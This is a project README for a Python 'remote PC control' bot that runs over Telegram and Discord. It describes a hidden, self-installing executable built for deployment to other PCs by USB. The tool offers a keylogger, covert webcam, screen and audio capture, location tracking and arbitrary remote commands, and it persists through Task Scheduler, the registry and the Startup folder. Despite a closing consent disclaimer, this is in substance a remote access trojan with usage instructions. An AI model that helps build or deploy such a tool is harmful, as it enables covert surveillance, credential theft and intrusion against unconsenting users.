<div align="center">

<img src="https://img.shields.io/badge/Python-3.11+-3776AB?style=for-the-badge&logo=python&logoColor=white"/>
<img src="https://img.shields.io/badge/Telegram-Bot_API-26A5E4?style=for-the-badge&logo=telegram&logoColor=white"/>
<img src="https://img.shields.io/badge/Discord-Bot-5865F2?style=for-the-badge&logo=discord&logoColor=white"/>
<img src="https://img.shields.io/badge/Windows-10%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white"/>
<img src="https://img.shields.io/badge/Linux-Supported-FCC624?style=for-the-badge&logo=linux&logoColor=black"/>
<img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge"/>

# 🖥️ PC Remote Bot

### Telegram & Discord Based Remote PC Control System

Control and monitor your Windows/Linux PCs from **anywhere in the world**  
using **Telegram** or **Discord** — or both simultaneously.  
Supports **multiple PCs**, **live screen**, **audio recording**, **keystroke capture** and more.

**[Features](#-features) • [Installation](#-installation) • [Builder CLI](#-builder-cli) • [Commands](#-commands) • [Multi-PC](#-multi-pc-support) • [Security](#-security) • [Discord Setup](#-discord-setup)**

</div>

---

## 📌 Overview

PC Remote Bot uses **Telegram** and **Discord** as secure communication channels. No dedicated server, no port forwarding, no static IP required. A single Python script powers both bots simultaneously with a shared core for all system functions.

```
Your Phone / PC
  ┌──────────────┐    ┌──────────────┐
  │ Telegram App │    │  Discord App │
  └──────┬───────┘    └──────┬───────┘
         │ HTTPS             │ WebSocket
         ▼                   ▼
  ┌─────────────┐    ┌──────────────┐
  │ Telegram API│    │  Discord API │
  └──────┬──────┘    └──────┬───────┘
         │                  │
         └────────┬─────────┘
                  │ Long Poll / Gateway
       ┌──────────┼──────────┐
       ▼          ▼          ▼
  [PC1-Office] [PC2-Home] [PC3-Laptop]
   tracker.exe  tracker.exe  tracker.exe
   TG Thread    TG Thread    TG Thread
   DC Thread    DC Thread    DC Thread
   ──── Shared Core Functions ────
```

---

## ✨ Features

| Category | Features |
|---|---|
| 🖥️ **System** | Status, Lock, Shutdown, Restart |
| 📸 **Media** | Screenshot, Webcam (auto-deleted after send) |
| 🖥️ **Live Screen** | Real-time screen frames (Discord) |
| 🎙️ **Audio** | Voice recording, Live audio streaming |
| ⌨️ **Keylogger** | Real-time and interval capture (no admin needed) |
| 📁 **Files** | List, Upload, Download, Delete, Search |
| 💻 **Terminal** | Run any Windows/Linux command remotely |
| 🔊 **Audio Control** | Volume Up/Down/Mute, Set exact %, TTS |
| ☀️ **Display** | Get/Set screen brightness |
| 📍 **Location** | IP-based location with Google Maps link |
| 🔔 **Notifications** | Popup on screen, Ask with reply |
| 🔁 **Auto Track** | Auto location every 5 minutes |
| 🚨 **Alarm** | Remote alarm sound with loop |
| ☀️ **Wake Detection** | Notifies when PC wakes from sleep |
| 🤖 **Multi-PC** | Control multiple PCs from one account |
| 🔧 **Builder CLI** | Generate pre-configured exe in one command |
| 📦 **Self Installer** | Auto-installs silently on first run |

---

## 🚀 Installation

### Prerequisites

```bash
pip install -r requirements.txt
```

> **Note:** On Windows, if `pyaudio` fails:
> ```bash
> pip install pipwin
> pipwin install pyaudio
> ```
> On Linux:
> ```bash
> sudo apt install python3-pyaudio portaudio19-dev
> ```

---

### Method 1 — Run as Python Script

```bash
# Clone repo
git clone https://github.com/yourusername/pc-remote-bot.git
cd pc-remote-bot

# Install dependencies
pip install -r requirements.txt

# Telegram only
python tracker.py -p telegram --api YOUR_TOKEN --chat YOUR_CHAT_ID

# Discord only
python tracker.py -p discord --api YOUR_DISCORD_TOKEN --channel YOUR_CHANNEL_ID

# Both simultaneously
python tracker.py -p both --api TG_TOKEN --chat CHAT_ID --dapi DC_TOKEN --channel CHANNEL_ID

# Linux mode
python tracker.py -p telegram --api TOKEN --chat ID -s linux
```

> **How to get credentials:**
> - **Telegram Token:** Message [@BotFather](https://t.me/BotFather) → `/newbot` → copy token
> - **Telegram Chat ID:** Message [@userinfobot](https://t.me/userinfobot) → copy ID
> - **Discord Token:** [Developer Portal](https://discord.com/developers/applications) → Bot → Copy Token
> - **Discord Channel ID:** Enable Developer Mode → Right click channel → Copy ID

---

### Method 2 — Builder CLI (Recommended)

Generate a pre-configured standalone `.exe` with one command:

```bash
# Telegram exe
python builder.py -p telegram --api YOUR_TOKEN --chat YOUR_CHAT_ID

# Discord exe
python builder.py -p discord --api YOUR_TOKEN --channel YOUR_CHANNEL_ID

# Both platforms
python builder.py -p both --api TG_TOKEN --chat ID --dapi DC_TOKEN --channel ID

# With custom name and icon
python builder.py -p telegram --api TOKEN --chat ID --name MyBot --icon icon.ico

# Linux binary
python builder.py -p telegram --api TOKEN --chat ID -s linux
```

**Output:** `dist/PCRemoteBot.exe` — copy to any PC and run!

---

### Method 3 — Deploy to Other PCs (No Python Needed)

```
1. Run builder.py on your main PC
   → Creates dist/tracker.exe

2. Copy to USB:
   tracker.exe + alarm.wav (optional)

3. On other PC: double-click tracker.exe

4. It silently auto-installs:
   ✅ Copies to C:\Tools\tracker\
   ✅ Task Scheduler (best, needs admin)
   ✅ Registry HKCU (backup, no admin)
   ✅ Startup folder (backup, no admin)

5. Check Telegram/Discord for online message ✅
```

---

## 🔧 Builder CLI

```
python builder.py [options]

Arguments:
  -p, --platform    Platform: telegram | discord | both
  --api             Telegram Bot Token (or Discord if -p discord)
  --chat            Telegram Chat ID
  --dapi            Discord Bot Token (only for -p both)
  --channel         Discord Channel ID
  -s, --system      Target OS: windows | linux
  --name            Output exe name (default: PCRemoteBot)
  --icon            Path to .ico icon file
  --no-install      Skip self-installer in exe
```

**Examples:**
```bash
python builder.py -p telegram --api 123:ABC --chat 987654321
python builder.py -p discord --api TOKEN --channel 123456789 --name MyBot
python builder.py -p both --api TG --chat ID --dapi DC --channel CH --icon icon.ico
python builder.py -p telegram --api TOKEN --chat ID -s linux
```

---

## 📋 Commands

### 🖥️ System
| Command | Description |
|---|---|
| `/devices` | Show all connected PCs with status |
| `/status` | CPU, RAM, Battery, Uptime |
| `/lock` | Lock the PC screen |
| `/shutdown` | Shutdown PC in 5 seconds |
| `/restart` | Restart PC in 5 seconds |

### 🔊 Audio & Display
| Command | Description |
|---|---|
| `/volume up` / `/volume down` / `/volume mute` | Volume control |
| `/vol 60` | Set exact volume (0-100) |
| `/brightness` | Get current brightness |
| `/brightness 70` | Set brightness (0-100) |
| `/say Hello World` | Text to speech on PC |

### 📁 File Manager
| Command | Description |
|---|---|
| `/ls` | List current directory |
| `/ls C:\Users\Desktop` | List specific folder |
| `/upload C:\file.pdf` | Send file to Telegram/Discord |
| `/download C:\Desktop\` | Reply to file message to save |
| `/delete C:\file.txt` | Delete file or folder |
| `/search report C:\Users` | Search file by name |

### 📸 Media
| Command | Description |
|---|---|
| `/screenshot` | Take screenshot (auto-deleted from PC) |
| `/webcam` | Take webcam photo (auto-deleted from PC) |
| `/livescreen 60 3` | Live screen frames (duration secs, interval secs) |
| `/stopscreen` | Stop live screen |

### 💻 Terminal
| Command | Description |
|---|---|
| `/cmd ipconfig` | Run any Windows/Linux command |
| `/cmd tasklist` | Show running processes |
| `/cmd dir C:\` | List directory |
| `/cmd ping google.com` | Ping test |

### ⌨️ Keylogger
| Command | Description |
|---|---|
| `/keylog rt` | Real-time keys sent every 3 seconds |
| `/keylog 5` | Interval keys every 5 minutes |
| `/getkeys` | Get captured keys on demand |
| `/savekeys` | Save keys as file and upload |
| `/stopkey` | Stop keylogger |

### 🎙️ Audio Recording
| Command | Description |
|---|---|
| `/record 30` | Record 30 seconds and send |
| `/liveaudio 60` | Live audio chunks every 10 seconds |
| `/stopaudio` | Stop recording |

### 📍 Location & Tracking
| Command | Description |
|---|---|
| `/track` | Get current location once |
| `/auto` | Auto location every 5 minutes |
| `/stop` | Stop auto tracking |

### 🔔 Notifications
| Command | Description |
|---|---|
| `/notify Hello` | Show popup message on PC screen |
| `/ask Are you there?` | Show input box, receive reply in chat |

### 🚨 Alarm
| Command | Description |
|---|---|
| `/alarm` | Start looping alarm sound |
| `/stop_alarm` | Stop the alarm |

---

## 🎮 Discord Setup

**Step 1 — Create Bot:**
```
1. Go to: discord.com/developers/applications
2. New Application → Name: "PC Remote Bot"
3. Bot → Add Bot → Copy Token ✅
4. Scroll down → Enable ALL Privileged Intents:
   ✅ Presence Intent
   ✅ Server Members Intent
   ✅ Message Content Intent
5. Save Changes
```

**Step 2 — Add Bot to Server:**
```
1. OAuth2 → URL Generator
2. Scopes: tick "bot"
3. Permissions: Send Messages, Attach Files,
               Read Message History, View Channels
4. Copy generated URL → open in browser → Authorize
```

**Step 3 — Get Channel ID:**
```
1. Discord Settings → Advanced → Enable Developer Mode
2. Right click your channel → Copy Channel ID ✅
```

**Discord Server Used in This Project:**
```
Server Name : PC Remote Bot
Channel     : #pc-remote
```

---

## 🖥️ Multi-PC Support

```
Telegram:
  /devices → shows all PCs as inline buttons
  Tap a PC → select it → use command buttons
  Tap ⬅️ Back → switch to another PC

Discord:
  /devices → shows all PCs with status
  /select PC2-Home → switch to PC2
  Now all commands run on PC2 only ✅
```

| Status | Meaning |
|---|---|
| 🟢 Green | Online — heartbeat received < 2 minutes ago |
| 🔴 Red | Offline — no heartbeat for 2+ minutes |

---

## 🔒 Security

| Layer | How It Works |
|---|---|
| **Chat ID Filter** | Only your Telegram/Discord account can send commands |
| **BOT_START_TIME** | Commands sent while PC was offline are ignored |
| **PC Selection** | Only the selected PC executes commands |
| **Mutex** | Prevents duplicate instances and duplicate messages |
| **Reply Security** | Bot token never written to VBS or temp files |
| **Auto Cleanup** | Screenshots/webcam photos deleted after upload |
| **UAC Fallback** | Falls back to non-admin methods if UAC denied |

---

## 📁 Project Structure

```
pc-remote-bot/
├── tracker.py          ← Main bot script (Telegram + Discord)
├── builder.py          ← CLI builder - generates configured exe
├── build.bat           ← PyInstaller build helper
├── install.bat         ← Universal Windows installer
├── uninstall.bat       ← Complete removal script
├── requirements.txt    ← Python dependencies
├── alarm.wav           ← Alarm sound (optional)
├── icon.ico            ← Exe icon (optional)
└── README.md           ← This file
```

---

## ⚙️ Auto-Start System

When exe runs for first time, it silently sets up 3 autostart methods:

```
PC boots → User logs in
    → Task Scheduler triggers (15s delay)
    → Waits for internet connectivity
    → Starts tracker.exe completely hidden
    → Bot sends "PC is Online" to Telegram/Discord ✅

3 methods ensure reliability:
  1. Task Scheduler  → most reliable (needs admin)
  2. Registry HKCU   → backup (no admin needed)
  3. Startup folder  → last resort (no admin needed)

Mutex prevents duplicates → only 1 online message ✅
```

---

## 🧠 How It Works

**Telegram — Long Polling:**
Bot calls `getUpdates` with 30s timeout. Server holds connection until new message arrives. No public server needed.

**Discord — Gateway WebSocket:**
discord.py maintains persistent connection to Discord Gateway using asyncio event loop.

**Threading Model:**

| Thread | Purpose | Type |
|---|---|---|
| Main Thread | Command routing | Blocking |
| Heartbeat | Keep-alive every 60s | Daemon |
| Wake Listener | Detect sleep/wake | Daemon |
| Auto Track | Location every 5 mins | Daemon |
| Keylogger | Continuous key capture | Daemon |
| Audio | Recording/streaming | Daemon |
| Live Screen | Frame capture loop | Daemon |

---

## ⚠️ Limitations

| Limitation | Details | Workaround |
|---|---|---|
| Telegram upload | 50MB max | Use Discord or compress |
| Discord upload | 8MB free / 500MB Nitro | Use Nitro or split |
| Location accuracy | IP-based, not GPS | Sufficient for city level |
| Live screen FPS | ~0.3fps (frame-by-frame) | Use Discord for better experience |
| Linux autostart | Manual setup required | Use systemd or .desktop file |

---

## 🛡️ Legal & Ethical Use

> ⚠️ **This tool is designed for use on YOUR OWN PCs only.**  
> Running on someone else's device without explicit consent is illegal  
> under computer fraud and privacy laws in most countries.  
> Use responsibly and ethically.
